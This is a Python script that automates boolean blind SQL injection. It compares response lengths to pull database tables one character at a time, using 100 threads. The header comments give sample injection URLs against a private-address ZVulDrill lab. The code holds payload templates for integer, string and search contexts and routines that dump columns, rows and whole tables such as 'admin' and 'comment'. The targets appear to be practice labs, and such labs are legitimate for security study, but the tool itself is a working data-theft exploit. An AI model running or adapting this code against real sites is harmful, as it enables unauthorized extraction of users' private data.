# http://172.30.61.112/ZVulDrill-master/search.php?search=1'or if((select ascii(substr((select admin_name from admin limit 0,1),1,1))=97),1,0)%23
# http://172.30.61.112/ZVulDrill-master/search.php?search=1'or if((select ascii(substr((select comment_text from comment limit 0,1),1,1))=49),1,0)%23

import time, threading
from global_data import glovar, glofun
from concurrent.futures import ThreadPoolExecutor

local_data = threading.local()


class datadump_thread():

    def __init__(self, url=glovar.url4, cookie=glovar.cookie, type='int', tbname='movies', coname_list=[], rowcount=10,
                 coname='title', row_order=0):

        self.url = url
        self.cookie = cookie
        self.type = type
        self.tbname = tbname
        self.coname_list = coname_list
        self.coname = coname
        self.row_order = row_order
        self.rowcount = rowcount
        self.columndata = []  # 一列的数据
        self.full_data_dict = {'coname': coname_list}

        self.ascii_value = ["0", "32", "45","46", "58", "95"]  # NULL (SPACE) . : _

        for i in range(97, 123):
            self.ascii_value.append(str(i))  # 小写字母

        for i in range(48, 58):
            self.ascii_value.append(str(i))  # 数字

        for i in range(65, 91):
            self.ascii_value.append(str(i))  # 大写字母


        if self.type == 'int':
            self.payload = '+or+if((select+ascii(substr((select+{coname}+from+' + self.tbname + '+limit+{data_row_order},1),{data_location},1))={ascii_number}),1,0)'
        elif self.type == 'string':
            self.payload = '\'+or+if((select+ascii(substr((select+{coname}+from+' + self.tbname + '+limit+{data_row_order},1),{data_location},1))={ascii_number}),1,0)%23'
        elif self.type == 'search':
            self.payload = '%\'+or+if((select+ascii(substr((select+{coname}+from+' + self.tbname + '+limit+{data_row_order},1),{data_location},1))={ascii_number}),1,0)%23'

    # 读取列数据
    def use_threadpool_to_get_single_column_data(self):

        executor = ThreadPoolExecutor(max_workers=100)
        row_orderlist = []

        for i in range(0, self.rowcount):
            row_orderlist.append(i)

        for data in executor.map(self.get_single_column_data_by_response_length, row_orderlist):
            self.columndata.append(data)

        print(self.columndata)

    def get_single_column_data_by_response_length(self, row_order):

        local_data.row_order = row_order
        local_data.coname = self.coname

        local_data.url_read_length = 0
        local_data.response_length = 0

        local_data.single_data = ''
        local_data.return_data = ''

        for j in self.ascii_value:

            full_payload = self.url + self.payload.format(coname=str(local_data.coname),
                                                          data_row_order=str(local_data.row_order),
                                                          data_location=str(1),
                                                          ascii_number=str(j))

            url_read = glofun.url_request(full_payload, self.cookie)

            local_data.url_read_length = len(url_read)

            if (local_data.url_read_length - local_data.response_length) > 50:
                local_data.response_length = local_data.url_read_length  # 与之前的包大小相差很大，所以取较大的返回包大小为正确的返回包

                local_data.single_data = chr(int(j))

                print(local_data.single_data)

        for k in range(2, 35):

            for j in self.ascii_value:

                local_data.fuc_start = time.time()

                full_payload = self.url + self.payload.format(coname=str(local_data.coname),
                                                              data_row_order=str(local_data.row_order),
                                                              data_location=str(k),
                                                              ascii_number=str(j))

                url_read = glofun.url_request(full_payload, self.cookie)

                local_data.url_read_length = len(url_read)

                # 如果返回包的长度等于或者在比之前包只小了100之内，则是正确的包
                if (local_data.response_length - local_data.url_read_length) < 50:

                    # 如果返回了0，说明返回的是NULL,到了表名字的结果，跳出，寻找下一个表
                    if k != 1:

                        if j == '0':
                            print(local_data.single_data)

                            local_data.return_data = local_data.single_data

                            local_data.single_data = ""

                            break

                    local_data.single_data += chr(int(j))

                    print(local_data.single_data)

            # 跳出多重循环
            else:

                continue

            break

        print(local_data.return_data)

        return local_data.return_data

    # 读取行数据
    def use_threadpool_to_get_singe_row_data(self):

        executor = ThreadPoolExecutor(max_workers=100)

        for data in executor.map(self.get_singe_row_data_by_response_length2, self.coname_list):
            self.columndata.append(data)

        print(self.columndata)

    def get_singe_row_data_by_response_length(self, coname):

        local_data.coname = coname
        local_data.row_order = self.row_order

        local_data.url_read_length = 0
        local_data.response_length = 0

        local_data.single_data = ''
        local_data.return_data = ''

        for j in self.ascii_value:

            full_payload = self.url + self.payload.format(coname=str(local_data.coname),
                                                          data_row_order=str(local_data.row_order),
                                                          data_location=str(1),
                                                          ascii_number=str(j))

            url_read = glofun.url_request(full_payload, self.cookie)

            local_data.url_read_length = len(url_read)

            if (local_data.url_read_length - local_data.response_length) > 50:
                local_data.response_length = local_data.url_read_length  # 与之前的包大小相差很大，所以取较大的返回包大小为正确的返回包

                local_data.single_data = chr(int(j))

                print(local_data.single_data)

        for k in range(2, 35):

            for j in self.ascii_value:

                local_data.fuc_start = time.time()

                full_payload = self.url + self.payload.format(coname=str(local_data.coname),
                                                              data_row_order=str(local_data.row_order),
                                                              data_location=str(k),
                                                              ascii_number=str(j))

                url_read = glofun.url_request(full_payload, self.cookie)

                local_data.url_read_length = len(url_read)

                # 如果返回包的长度等于或者在比之前包只小了100之内，则是正确的包
                if (local_data.response_length - local_data.url_read_length) < 50:

                    # 如果返回了0，说明返回的是NULL,到了表名字的结果，跳出，寻找下一个表
                    if k != 1:

                        if j == '0':
                            print(local_data.single_data)

                            local_data.return_data = local_data.single_data

                            local_data.single_data = ""

                            break

                    local_data.single_data += chr(int(j))

                    print(local_data.single_data)

            # 跳出多重循环
            else:

                continue

            break

        print(local_data.return_data)

        return local_data.return_data

    # 读取全表数据
    def use_threadpool_to_get_full_data(self):

        executor = ThreadPoolExecutor(max_workers=100)

        for i in range(0, self.rowcount):
            self.row_order = i

            for data in executor.map(self.get_singe_row_data_by_response_length, self.coname_list):
                self.columndata.append(data)

            print(self.columndata)

            self.full_data_dict[self.row_order] = self.columndata

            self.columndata=[]

        print(self.full_data_dict)

        return self.full_data_dict





if __name__ == "__main__":
    t1 = datadump_thread(url=glovar.url4, cookie=glovar.cookie, type='int', tbname='movies',
                         coname_list=['id', 'title', 'release_year', 'genre', 'main_character', 'imdb',
                                      'tickets_stock'], coname='title', rowcount=10)

    t2 = datadump_thread(url=glovar.url3, cookie=False, type='search', tbname='comment', coname_list=['comment_id', 'user_name', 'comment_text', 'pub_date'], coname='comment_text', rowcount=9)

    # t1.use_threadpool_to_get_single_column_data()

    # t1.use_threadpool_to_get_single_row_data()

    t2.use_threadpool_to_get_full_data()


